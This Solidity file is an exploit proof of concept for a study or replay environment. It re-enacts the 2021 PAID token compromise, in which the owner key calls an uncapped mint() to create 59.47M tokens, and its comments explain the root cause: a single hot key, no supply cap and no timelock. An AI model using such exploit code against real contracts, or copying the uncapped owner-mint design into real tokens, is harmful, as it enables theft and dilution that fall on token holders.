// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-03-PAID).
//
// The real on-chain attack had NO exploit contract: the compromised PAID
// owner/deployer key (EOA 0x1873…65bE) simply sent `mint()` directly to the PAID
// proxy. The DeFiHackLabs PoC reproduces this with `vm.prank(owner)` then a direct
// `PAID.mint(receiver, amount)`.
//
// We can't deploy a normal exploit contract and have it call mint(), because the
// implementation's `mint` is `onlyOwner` and the owner address is HARDCODED in the
// implementation bytecode (PUSH20 0x1873…65bE at pc 2493, then `CALLER == owner`).
// A deployed intermediary's address would never equal the owner, so it would revert.
//
// So this contract is run AT the owner address (config `etchAt`): the recorder
// places this RUNTIME bytecode at the owner EOA (vm.etch — no constructor runs),
// then calls `run()` as the owner. Now when `run()` calls `PAID.mint(...)`, the
// proxy delegatecalls into the implementation and `CALLER` (msg.sender) == the
// owner address == the hardcoded owner — so `onlyOwner` passes, exactly as it did
// when the real owner key signed the malicious tx. The net effect (owner address
// calls mint) is identical to the live incident; only the mechanism differs.
//
// Because vm.etch skips the constructor, the exploit has NO constructor state.
//
// Root cause: PAID's ERC20 implementation exposes an owner-only `mint()` with NO
// maximum supply, NO per-call cap, and NO timelock, behind an upgradeable proxy
// whose admin is the same single key. One compromised hot key → infinite mint.

interface IPaid {
    function mint(address _owner, uint256 _amount) external;
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract PAIDMintExploit {
    // The PAID token — a transparent EIP-1967 proxy. The proxy holds the storage
    // (balances + totalSupply); its fallback delegatecalls all logic into the
    // implementation at 0xB828…B9C7 (unverified on Etherscan).
    IPaid constant PAID = IPaid(0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df);

    // The mint recipient — address(this) in the Foundry test (0x7FA9…1496). Kept
    // identical so the profit accounting (balance delta on this receiver) matches
    // the trace exactly: receiver goes 0 → 59,471,745.571 PAID.
    address constant RECEIVER = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;

    // 59,471,745.571 PAID — ~11.11% of the 535.2M pre-exploit supply (+10% of the
    // new total). Created from nothing via mint(); the attacker then dumped it.
    uint256 constant MINT_AMOUNT = 59_471_745_571_000_000_000_000_000;

    // The whole attack — one authorized-but-malicious call. The recorder calls
    // this AS the owner address (etchAt), so mint()'s onlyOwner check passes.
    function run() external {
        // 1. Snapshot the supply *before* — for the on-chain effect (the mint
        //    itself writes to the proxy's storage via delegatecall). The attacker
        //    chose ~11% of the existing supply so the dilution looked "modest".
        uint256 supplyBefore = PAID.totalSupply();

        // 2. Create 59.47M PAID out of thin air. mint() is owner-only but has NO
        //    supply cap and NO timelock, so the full amount is minted in one shot.
        //    The proxy delegatecalls this into the implementation; onlyOwner passes
        //    because msg.sender == the owner address == the hardcoded owner.
        PAID.mint(RECEIVER, MINT_AMOUNT);

        // 3. The freshly-minted balance is now spendable. mint() emitted
        //    Transfer(from = 0x0, to = RECEIVER) — the ERC-20 "created from
        //    nothing" signal — and totalSupply rose ~11% (canonical, via the proxy).
        uint256 minted = PAID.balanceOf(RECEIVER);
        uint256 supplyAfter = PAID.totalSupply();
        assert(minted == MINT_AMOUNT); // receiver got exactly the minted amount
        assert(supplyAfter - supplyBefore == MINT_AMOUNT); // supply inflated by it
    }
}
